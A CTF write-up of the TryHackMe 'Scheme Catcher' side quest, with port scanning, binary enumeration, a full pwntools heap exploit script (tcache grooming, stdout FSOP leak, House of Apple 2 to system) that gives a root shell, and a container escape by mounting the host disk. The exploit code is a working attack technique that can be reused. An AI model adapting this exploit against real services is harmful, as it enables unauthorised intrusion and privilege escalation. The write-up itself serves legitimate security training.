<h1 align="center"><a href="https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK">Scheme Catcher</a></h1>
<h3 align="center">Advent of Cyber 2025 &nbsp;|&nbsp; Side Quest</h3>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/15aa243c-c2b7-491b-b2cc-a0214d821c3a"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2014-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>


<br>
<h2>Task 1 . Introduction</h2>

<h3>The Silent Control System of the Jester</h3>
<p>Once upon a time, before Hopper’s laughter echoed through HopSec Asylum, investigators discovered whispers about a strange server hidden somewhere on his personal systems. No one has actually seen it, no one has managed to access it, and every attempt to break in has failed. The few traces that exist point to a rough and unstable copy of King Malhare’s old command and control setup, rebuilt by Hopper into something twisted and unpredictable. Rumours say the place is scattered with odd folders, stray notes, and several suspicious binaries that seem to pulse with their own rhythm. Hopper is obsessed with building things, changing things, and breaking things just to rebuild them again, and he insists he never commits a single mistake. In his mind, everything he creates is perfect, even if it looks like chaos from the outside.<br>

Stranger still is how the server behaves when anyone approaches. Connections drop without reason. Tasks appear, vanish, and then reappear elsewhere. Logs rewrite themselves. Some scripts reply to commands with messages that feel a little too aware. Hopper calls the place his masterpiece. He says it’s alive. He says it only listens to him.<br>

Whether he planned sabotage, rebellion, or something far stranger remains unknown because no analyst has managed to look inside. All that is certain is that Hopper guards this secret with a wild grin and a mind that slips further away each day. The question is now: Can you prove he is wrong, or get lost in his madness</p>

<h3>Rules</h3>
<p>

- <strong>Do not</strong> share questions or hints, including in videos, streams, or any other medium while the event is running (until Dec 31st).<br>
- Only hack machines deployed in the rooms you have legitimate, authorised access to.<br>
- <code>*.tryhackme.com</code> and VPN servers are off-limits for probing, scanning, or exploiting.<br>
- Teaming up is permitted.<br>

For a more comprehensive list, please read the <a href="https://help.tryhackme.com/en/articles/8537472-advent-of-cyber-2025-terms-and-condition">Advent of Cyber 2025 Terms and Conditions</a>.<br>

This Side Quest is unlocked by finding the Side Quest key in <a href="https://tryhackme.com/room/attacks-on-ecrypted-files-aoc2025-asdfghj123">Advent of Cyber 2025 Day 9</a>. f you have been savvy enough to find it, you can unlock the machine by visiting <code>MACHINE_IP:21337</code> and entering your key. Happy Side Questing!
</p>

<p><em>Answer the questions below</em></p>

<p>

- Navigate to <code>MACHINE_IP:21337</code><br>
- Enter the <strong>Memory Key</strong> discovered in <strong>Advent of Cyber 2025, Day 9</strong><br>
- Click <strong>UNLOCK MEMORIES</strong></p>

<br>
<h1 align="center">Port Scanning<a id='1'></a></h1>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                       |
|-------------------:|:---------------------|:----------------------------------|
| `22`               |`SSH`                 |OpenSSH 9.6p1 Ubuntu 3ubuntu13.11  |
| `80`               |`HTTP`                |Apache httpd 2.4.58                |
| `9004`             |`Unknown`             |-                                  |
| `21337`            |`-`                   |-                                  |

</p></div><br>


```bash
:~# nmap -sC -sV -Pn -n -p- -T4 10.64.168.0
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Under Construction
9004/tcp  open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     Payload Storage Malhare's
|     Version 4.2.0
|     >>Invalid option
|   GenericLines, NULL: 
|     Payload Storage Malhare's
|_    Version 4.2.0
21337/tcp open  unknown
...
```


<br>
<h1 align="center">Directory & File Enumeration<a id='2'></a></h1>


```bash
:~# ffuf -u http://xx.xx.xxx.xx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301 -e .html,.zip,.txt -ic -c -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xx.xxx.xx/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .html .zip .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200,301
________________________________________________

                        [Status: 200, Size: 3455, Words: 1317, Lines: 129]
index.html              [Status: 200, Size: 3455, Words: 1317, Lines: 129]
dev                     [Status: 301, Size: 310, Words: 20, Lines: 10]
:: Progress: [873060/873060] :: Job [1/1] :: 11488 req/sec :: Duration: [0:01:17] :: Errors: 0 ::
```

<img width="1258" height="428" alt="image" src="https://github.com/user-attachments/assets/616f8540-c232-4975-b27e-2c5ebba044f7" />


<br>
<br>
<br>
<h1 align="center">Web Interface Inspection<a id='3'></a></h1>

<img width="1200" height="474" alt="image" src="https://github.com/user-attachments/assets/2c94c5f9-75b1-4437-a396-d8d7e10ea53a" />

<br>
<br>
<br>
<p align="center">4.2.0.zip</p>

<img width="1196" height="267" alt="image" src="https://github.com/user-attachments/assets/e1cff400-1d22-4713-b043-c42d3e0cb597" />

<br>
<br>
<br>

```bash
:~/SchemeCatcher# ls
4.2.0.zip
```

```bash
:~/SchemeCatcher# file 4.2.0.zip
4.2.0.zip: Zip archive data, at least v1.0 to extract
```

```bash
:~/SchemeCatcher# unzip 4.2.0.zip
Archive:  4.2.0.zip
   creating: latest/
  inflating: latest/beacon.bin       
```

<img width="1262" height="156" alt="image" src="https://github.com/user-attachments/assets/c713419a-e734-4693-bd3f-72a18b454431" />

<br>
<br>
<br>

```bash
:~/SchemeCatcher# ls
4.2.0.zip  latest
```

```bash
:~/SchemeCatcher# cd latest
```

```bash
:~/SchemeCatcher/latest# file beacon.bin
beacon.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6130a2932421dfd5fb7f8034bd8ca749bac01434, for GNU/Linux 3.2.0, not stripped
```

```bash
:~/SchemeCatcher/latest# strings beacon.bin > strings.txt
```


```bash
:~/SchemeCatcher/latest# grep -E THM strings.txt
THM{••••••••••••••••••••••••••••••}
```

<br>
<br>
<br>

<img width="1259" height="86" alt="image" src="https://github.com/user-attachments/assets/827894f4-c327-401d-b184-314969ffdca8" />

<br>
<br>
<br>
<p>1.1. <em>What is the flag hidden in the file?</em><br>
<code>THM{••••••••••••••••••••••••••••••}</code></p>
<br>

<p align="center">4.2.0.R1-1337.server.zip</p>

<img width="1024" height="315" alt="image" src="https://github.com/user-attachments/assets/0ad26848-c63e-46b7-9a1c-37082812ae36" />

<br>
<br>
<br>

<img width="1022" height="153" alt="image" src="https://github.com/user-attachments/assets/0b88359f-c05c-40af-8888-4fbd845eb256" />

<br>
<br>
<br>

<img width="1152" height="74" alt="image" src="https://github.com/user-attachments/assets/a4887ff0-a7c1-4122-8130-9e90684b03b1" />

<br>
<br>
<br>
<p>1.2. <em>What is the content of foothold.txt?</em><br>
<code>THM{••••••••••••••••••••••••••••••}</code></p>


<img width="1022" height="139" alt="image" src="https://github.com/user-attachments/assets/78f5c3c3-004f-4f16-8631-48e0f3fc89dd" />

<br>
<br>
<br>


```bash
:~/SchemeCatcher# file 4.2.0-R1-1337-server.zip
4.2.0-R1-1337-server.zip: Zip archive data, at least v2.0 to extract
```

```bash
:~/SchemeCatcher# unzip 4.2.0-R1-1337-server.zip
Archive:  4.2.0-R1-1337-server.zip
  inflating: ld-linux-x86-64.so.2    
  inflating: libc.so.6               
  inflating: server                  
```

<img width="1192" height="145" alt="image" src="https://github.com/user-attachments/assets/cfb55127-ae05-497f-9a94-13bbaad096e1" />

<br>
<br>
<br>

<img width="1300" height="737" alt="image" src="https://github.com/user-attachments/assets/4b0eda81-ec80-4852-9afa-3dbca5f044d8" />

<br>
<br>
<br>

<img width="1302" height="774" alt="image" src="https://github.com/user-attachments/assets/0b9ee605-c008-4c0b-87de-7c1963779c38" />

<br>
<br>
<br>

<p align="center">solve.py</p>

```bash
#!/usr/bin/env python3 
from pwn import *
import io_file

# --- CONFIGURAÇÃO ---
# Se quiser ver detalhes, mude 'error' para 'debug'
context.update(arch="amd64", os="linux", log_level="error")
context.binary = elf = ELF("./server", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

exit_addr = libc.sym['exit']
stdout_addr = libc.sym['_IO_2_1_stdout_']

print("_____________________________________________________________________\n")
print("AoC 2025 - Scheme Catcher by Rosana                                  \n")
print("Starting Attack ...                                                  \n")

# LOOP DE FORÇA BRUTA
for heap_brute in range(16):
    for libc_brute in range(16):
        try:
            print("_____________________________________________________________________\n")
            print(f"\r           Trying Heap  |  Libc Brute     =      {heap_brute:#x}  |    {libc_brute:#x}")

            # SEU IP ALVO
            r = remote("10.64.157.180", 9004)       

            idx = -1

            # --- FUNÇÕES AUXILIARES ---
            def create(size):
                global idx
                idx = idx+1
                r.sendlineafter(b'\n>>', b'1')
                r.sendlineafter(b'size: \n', str(size).encode())
                return idx

            def update(index, data, offset=0):
                r.sendlineafter(b'\n>>', b'2')
                r.sendlineafter(b'idx:\n', str(index).encode())
                r.sendlineafter(b'offset:\n', str(offset).encode())
                r.sendafter(b'data:\n', data)

            def delete(index):
                r.sendlineafter(b'\n>>', b'3')
                r.sendlineafter(b'idx:\n', str(index).encode())

            # --- PREPARANDO O HEAP ---
            for _ in range(7):
                create(0x90-8)

            middle = create(0x90-8)

            playground = create(0x20 + 0x30 + 0x500 + (0x90-8)*2)
            guard = create(0x18)
            delete(playground)
            guard = create(0x18)

            corruptme = create(0x4c8)
            start_M = create(0x90-8)
            midguard = create(0x28)
            end_M = create(0x90-8)
            leftovers = create(0x28)
                
            update(playground,p64(0x651),0x18)
            delete(corruptme)

            offset = create(0x4c8+0x10)
            start = create(0x90-8)
            midguard = create(0x28)
            end = create(0x90-8)
            leftovers = create(0x18)

            create((0x10000+0x80)-0xda0-0x18)
            fake_data = create(0x18)
            update(fake_data,p64(0x10000)+p64(0x20))

            fake_size_lsb = create(0x3d8)
            fake_size_msb = create(0x3e8)
            delete(fake_size_lsb)
            delete(fake_size_msb)

            update(playground,p64(0x31),0x4e8)
            delete(start_M)
            update(start_M,p64(0x91),8)

            update(playground,p64(0x21),0x5a8)
            delete(end_M)
            update(end_M,p64(0x91),8)

            for i in range(7):
                delete(i)

            delete(end)
            delete(middle)
            delete(start)

            # TENTATIVA DE EXPLORAÇÃO
            heap_target = (heap_brute << 12) + 0x80
            update(start,p16(heap_target))
            update(end,p16(heap_target),8)
            exit_lsb = (libc_brute << 12) + (exit_addr & 0xfff)
            stdout_offset = stdout_addr - exit_addr
            stdout_lsb = (exit_lsb + stdout_offset) & 0xffff
            
            win = create(0x888)
            
            update(win,p16(stdout_lsb),8)
            stdout = create(0x28)
            update(stdout,p64(0xfbad3887)+p64(0)*3+p8(0))
            
            # --- VERIFICANDO SE FUNCIONOU ---
            try:
                # Tenta ler 8 bytes. Timeout curto para não travar o script.
                raw_data = r.recv(8, timeout=1)
                if not raw_data: raise Exception("Sem dados")
                libc_leak = u64(raw_data)
            except:
                # Se der erro ao receber, fecha e tenta o próximo
                r.close()
                continue

            # Filtro: Endereços válidos começam com 0x7f
            if (libc_leak & 0x0000ff0000000000) != 0x00007f0000000000:
                r.close()
                continue

            # --- SUCESSO! 

            libc.address = libc_leak - (stdout_addr + 132)
            print(f"           Possible Libc LEAK             =  {libc.address:#x}          ")
            print("\n_____________________________________________________________________\n")

            
            # GERA O PAYLOAD FINAL (SHELL)
            file = io_file.IO_FILE_plus_struct()
            payload = file.house_of_apple2_execmd_when_do_IO_operation(
                libc.sym['_IO_2_1_stdout_'],
                libc.sym['_IO_wfile_jumps'],
                libc.sym['system'])
            
            update(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
            full_stdout = create(0x3e0-8)
            update(full_stdout,payload)

            # ENTREGA A SHELL
            r.interactive()
            break

        except Exception as e:
            try:
                r.close()
            except:
                pass
            continue
```

<p>


- download https://raw.githubusercontent.com/corgeman/leakless_research/refs/heads/main/part_1/io_file.py<br>
- my refence was https://github.com/corgeman/leakless_research/blob/main/part_1/fsop_solve.py</p>

```bash
:~/SchemeCatcher# https://raw.githubusercontent.com/corgeman/leakless_research/refs/heads/main/part_1/io_file.py
```

```bash
:~/SchemeCatcher# ls
4.2.0-R1-1337-server.zip  4.2.0.zip  io_file.py  latest  ld-linux-x86-64.so.2  libc.so.6  __pycache__  server  solve.py
```

```bash
:~/SchemeCatcher# python3 solve.py
```

<img width="1354" height="810" alt="image" src="https://github.com/user-attachments/assets/2fcdfd9b-5d2b-49b9-a7d4-374568f6f5a4" />

<br>
<br>
<br>

<img width="1356" height="836" alt="image" src="https://github.com/user-attachments/assets/be2cbda4-694e-4988-b1f6-936f82658edf" />

<br>
<br>
<br>

```bash
$ id && hostname
uid=0(root) gid=0(root) groups=0(root)
bb21200fff81
```

```bash
$ pwd
/home/srv
```

```bash
$ ls -lah
total 6.9M
drwxr-xr-x 1 root root 4.0K Dec  2 07:36 .
drwxr-xr-x 1 root root 4.0K Dec  2 07:36 ..
-rwxrwxrwx 1 root root  411 Dec  2 06:11 id_rsa
-rwxrwxrwx 1 root root   97 Dec  2 06:11 id_rsa.pub
-rwxrwxr-x 1 root root 804K Dec  2 02:44 ld-linux-x86-64.so.2
-rwxrwxr-x 1 root root 6.1M Dec  2 02:44 libc.so.6
-rwxrwxr-x 1 root root  25K Dec  2 04:30 server
-rwxrwxr-x 1 root root   51 Dec  2 07:35 user.txt
```

```bash
$ cat user.txt
THM{••••••••••••••••••••••••••••••••••••••••••••••••••}
```

<br>
<p>1.3. <em>What is the content of user.txt?</em>em><br>
<code>THM{••••••••••••••••••••••••••••••••••••••••••••••••••}</code></em></p>
<br>
<br>



```bash
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```bash
$ mkdir /mnt/host
```

```bash
$ mnt /dev/nmve0n1p1 /mnt/host
```


```bash
$ ls -lah /mnt/host
total 1.1G
drwxr-xr-x  22 root root 4.0K Jan 14 22:18 .
drwxr-xr-x   1 root root 4.0K Jan 14 23:07 ..
-rw-r--r--   1 root root  180 Jan 14 22:18 .badr-info
lrwxrwxrwx   1 root root    7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Apr  8  2024 bin.usr-is-merged
drwxr-xr-x   3 root root 4.0K Nov 28 07:22 boot
-rw-------   1 root root  11M Sep  1  2024 core
drwxr-xr-x   5 root root 4.0K Oct 26  2020 dev
drwxr-xr-x 176 root root  12K Jan 14 22:18 etc
drwxr-xr-x   4 root root 4.0K Nov 30 14:52 home
lrwxrwxrwx   1 root root    7 Oct 26  2020 lib -> usr/lib
drwxr-xr-x   2 root root 4.0K Mar 31  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Oct 26  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Oct 26  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Oct 26  2020 libx32 -> usr/libx32
drwx------   2 root root  16K Oct 26  2020 lost+found
drwxr-xr-x   2 root root 4.0K Oct 26  2020 media
drwxr-xr-x   2 root root 4.0K Oct 26  2020 mnt
drwxr-xr-x   4 root root 4.0K Dec  9 06:18 opt
drwxr-xr-x   2 root root 4.0K Apr 15  2020 proc
drwx------   9 root root 4.0K Dec  9 06:34 root
drwxr-xr-x   3 root root 4.0K Oct 26  2020 run
lrwxrwxrwx   1 root root    8 Oct 26  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Apr  8  2024 sbin.usr-is-merged
drwxr-xr-x  13 root root 4.0K Sep  1  2024 snap
drwxr-xr-x   2 root root 4.0K Oct 26  2020 srv
-rw-------   1 root root 1.0G Oct  3  2024 swapfile
drwxr-xr-x   2 root root 4.0K Apr 15  2020 sys
drwxrwxrwt  17 root root  12K Jan 14 22:33 tmp
drwxr-xr-x  14 root root 4.0K Oct 26  2020 usr
drwxr-xr-x  15 root root 4.0K Dec  2 06:32 var
```

```bash
$ ls -lah /mnt/host/root/
total 96K
drwx------  9 root root 4.0K Dec  9 06:34 .
drwxr-xr-x 22 root root 4.0K Jan 14 22:18 ..
lrwxrwxrwx  1 root root    9 Feb 27  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4.0K Feb 27  2022 .cache
drwx------  4 root root 4.0K Nov 30 14:38 .config
drwx------  3 root root 4.0K Oct  3  2024 .launchpadlib
-rw-------  1 root root   20 Dec  2 06:40 .lesshst
drwxr-xr-x  3 root root 4.0K Feb 27  2022 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root    0 Dec  9 06:34 .python_history
-rw-r--r--  1 root root   66 Feb 27  2022 .selected_editor
drwx------  2 root root 4.0K Oct  3  2024 .ssh
-rw-------  1 root root  11K Dec  9 06:20 .viminfo
drwxr-xr-x  2 root root 4.0K Feb 27  2022 .vnc
-rwxr-xr-x  1 root root  16K Nov 30 02:05 admin_setkey
-rw-r--r--  1 root root  448 Nov 30 02:04 admin_setkey.c
-rw-r--r--  1 root root   17 Nov 30 02:04 key.bin
-rw-r--r--  1 root root   17 Nov 30 14:38 kkey
-rw-r--r--  1 root root   29 Dec  2 07:41 root.txt
drwxr-xr-x  5 root root 4.0K Sep  1  2024 snap
```

```bash
$ cat /mnt/hosts/root/root.txt
THM{•••••••••••••••••••••••}
```

<img width="1029" height="703" alt="image" src="https://github.com/user-attachments/assets/5bb0d78f-d566-465f-bf72-aaa8813777fd" />

<br>
<br>
<br>
<p>1.4. <em>What is the content of root.txt</em><br>
<code>THM{•••••••••••••••••••••••}</code></em></p>
<br>
<br>
<br>
<h1 align="center">Challenge Completed</h1>


<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/0c36cd3d-d446-4444-b8ad-1057338f06b2"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0b3051a1-e955-418e-a8d4-adb0d2f69522"></p>


<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|14     |Insane 🚩 - Scheme Catcher            |13 |     87ᵗʰ  |     3ʳᵈ    |      534ᵗʰ   |        5ᵗʰ     |    138,822  |    1,065    |    87     |
|13     |Hard 🚩 - Breachblocker Unlocker      |12 |     86ᵗʰ  |     3ʳᵈ    |      526ᵗʰ   |        5ᵗʰ     |    138,732  |    1,064    |    87     |
|11     |Medium 🚩 - Azure: Eyes Wide Shut     |10 |     86ᵗʰ  |     3ʳᵈ    |      558ᵗʰ   |        5ᵗʰ     |    138,450  |    1,063    |    86     |
|8      |Medium ⚙️ - Phishing Unfolding        | 7 |     86ᵗʰ  |     3ʳᵈ    |      508ᵗʰ   |        4ᵗʰ     |    138,372  |    1,062    |    84     |
|8      |Easy ⚙️ - Introduction to Phishing    | 7 |     96ᵗʰ  |     3ʳᵈ    |    2,479ᵗʰ   |       32ⁿᵈ     |    137,117  |    1,062    |    84     |
|8      |Medium 🔗 - KaffeeSec - SoMeSINT      | 7 |     98ᵗʰ  |     3ʳᵈ    |    2,847ᵗʰ   |       38ᵗʰ     |    137,052  |    1,062    |    84     |
|7      |Hard 🚩 - Hack Back                   | 6 |     98ᵗʰ  |     3ʳᵈ    |    2,798ᵗʰ   |       37ᵗʰ     |    136,908  |    1,061    |    84     |
|7      |Hard 🚩 - Dead End?                   | 6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
|6      |Easy 🔗 - Linux Strength Training     | 5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
|4      |Medium 🚩 - JVM Reverse Engineering   | 3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
|3      |Medium 🚩 - Carrotbane of My Existence| 2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
|2      |Easy 🔗 - Learn Rust                  | 1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |


</h6></div><br>

<p align="center">Global All Time:    87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/64bd93ac-626e-4155-adb0-feb73bd83db8"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/5bd11c18-9dca-4439-951c-1d7d3c4163e0"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/6a80cb67-afbc-4c75-a53b-f8244894a86f"><br><br>
                  Global monthly:     534ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a9c757ea-31a0-4139-9615-4a684b779b68"><br><br>
                  Brazil monthly:       5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/99d5ac81-2e7a-4685-8c3c-9d1a46e4cffb"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>

